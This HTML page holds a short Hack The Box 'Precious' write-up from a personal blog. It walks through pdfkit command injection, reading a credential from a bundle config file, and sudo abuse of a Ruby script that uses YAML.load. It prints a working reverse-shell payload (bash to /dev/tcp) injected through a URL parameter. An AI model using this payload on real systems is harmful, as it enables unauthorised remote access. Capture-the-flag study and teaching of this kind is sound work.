<!DOCTYPE html>
<link rel="stylesheet" href="/assets/css/syntax.css" type="text/css" />
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>Hack The Box - Precious [Easy]</title><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Hack The Box - Precious [Easy]" />
<meta name="author" content="Dimitar Ganev" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input." />
<meta property="og:description" content="We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input." />
<link rel="canonical" href="http://localhost:4000/ctf-writeup/2023/05/23/htb-precious.html" />
<meta property="og:url" content="http://localhost:4000/ctf-writeup/2023/05/23/htb-precious.html" />
<meta property="og:site_name" content="archive://syl" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-05-23T00:00:00+03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hack The Box - Precious [Easy]" />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"Dimitar Ganev"},"@type":"BlogPosting","description":"We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input.","headline":"Hack The Box - Precious [Easy]","dateModified":"2023-05-23T00:00:00+03:00","datePublished":"2023-05-23T00:00:00+03:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf-writeup/2023/05/23/htb-precious.html"},"url":"http://localhost:4000/ctf-writeup/2023/05/23/htb-precious.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="archive://syl" /><link rel="shortcut icon" type="image/x-icon" href="/logo.png" />
  <link rel="stylesheet" href="/assets/css/main.css" />
</head><body a="auto">
    <main class="page-content" aria-label="Content">
      <div class="w">
        <a href="/">..</a><article>
  <p class="post-meta">
    <time datetime="2023-05-23 00:00:00 +0300">2023-05-23</time>
  </p>
  
  <h1>Hack The Box - Precious [Easy]</h1>

  <p>We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input.</p>

<p>Then the website provided me with a PDF of the website that I’ve hosted, I’ve downloaded the PDF and used the <code class="language-plaintext highlighter-rouge">exiftool</code> to figure out what was generating this PDF file, from there I saw that it was generated by <code class="language-plaintext highlighter-rouge">pdfkit v0.8.6</code>.</p>

<p>I went to google to check if there are any exploits and I found this:</p>
<ul>
  <li>https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</li>
</ul>

<p>This apparently gives me a command injection exploit, and I tried the following payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://myip:8080/?name=#{'%20`bash -c "bash -i &gt;&amp; /dev/tcp/myip/myport 0&gt;&amp;1"`'}
</code></pre></div></div>

<h1 id="flag-1">Flag 1</h1>

<p>This gave me a reverse shell for the user <code class="language-plaintext highlighter-rouge">ruby</code>, from this point I’ve run <code class="language-plaintext highlighter-rouge">linpeas.sh</code> to check how can I gain access to the user <code class="language-plaintext highlighter-rouge">henry</code> and I saw the file <code class="language-plaintext highlighter-rouge">/home/ruby/.bundle/config</code> and I went to check it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/ruby/.bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:&lt;passwod&gt;"

</code></pre></div></div>

<p>I gained access to the user with an ssh login to the <code class="language-plaintext highlighter-rouge">hnery</code> user and gained the <code class="language-plaintext highlighter-rouge">user.txt</code> flag located in the home directory.</p>

<h1 id="flag-2">Flag 2</h1>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>henry on precious:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User henry may run the following commands on precious:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
</code></pre></div></div>

<p>This gives the clue of how to get the next flag, let’s look what this file contains:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Compare installed dependencies with those specified in "dependencies.yml"</span>
<span class="nb">require</span> <span class="s2">"yaml"</span>
<span class="nb">require</span> <span class="s1">'rubygems'</span>

<span class="c1"># TODO: update versions automatically</span>
<span class="k">def</span> <span class="nf">update_gems</span><span class="p">()</span>
<span class="k">end</span>

<span class="k">def</span> <span class="nf">list_from_file</span>
    <span class="no">YAML</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="s2">"dependencies.yml"</span><span class="p">))</span>
<span class="k">end</span>

<span class="k">def</span> <span class="nf">list_local_gems</span>
    <span class="no">Gem</span><span class="o">::</span><span class="no">Specification</span><span class="p">.</span><span class="nf">sort_by</span><span class="p">{</span> <span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">.</span><span class="nf">downcase</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">]</span> <span class="p">}.</span><span class="nf">map</span><span class="p">{</span><span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">.</span><span class="nf">to_s</span><span class="p">]}</span>
<span class="k">end</span>

<span class="n">gems_file</span> <span class="o">=</span> <span class="n">list_from_file</span>
<span class="n">gems_local</span> <span class="o">=</span> <span class="n">list_local_gems</span>

<span class="n">gems_file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">file_name</span><span class="p">,</span> <span class="n">file_version</span><span class="o">|</span>
    <span class="n">gems_local</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">local_name</span><span class="p">,</span> <span class="n">local_version</span><span class="o">|</span>
        <span class="k">if</span><span class="p">(</span><span class="n">file_name</span> <span class="o">==</span> <span class="n">local_name</span><span class="p">)</span>
            <span class="k">if</span><span class="p">(</span><span class="n">file_version</span> <span class="o">!=</span> <span class="n">local_version</span><span class="p">)</span>
                <span class="nb">puts</span> <span class="s2">"Installed version differs from the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
            <span class="k">else</span>
                <span class="nb">puts</span> <span class="s2">"Installed version is equals to the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
            <span class="k">end</span>
        <span class="k">end</span>
    <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<p>We have <code class="language-plaintext highlighter-rouge">YAML.load(File.read("dependencies.yml"))</code> which hints that we need to use the <code class="language-plaintext highlighter-rouge">dependancies.yml</code> file to gain root.</p>

<p>Using google again to see how can we do that, this took me some time, but figuring out the attack surface is what is this all about. The attack surface is being the YAML loader, so I’ve tried to look for exploits there, and I found this:</p>
<ul>
  <li>https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/</li>
</ul>

<p>I executed the <code class="language-plaintext highlighter-rouge">/usr/bin/ruby /opt/update_dependencies.rb</code> command with sudo and then using the <code class="language-plaintext highlighter-rouge">bash -p</code> I gained the root access.</p>

</article>
      </div>
    </main>
  </body>
</html>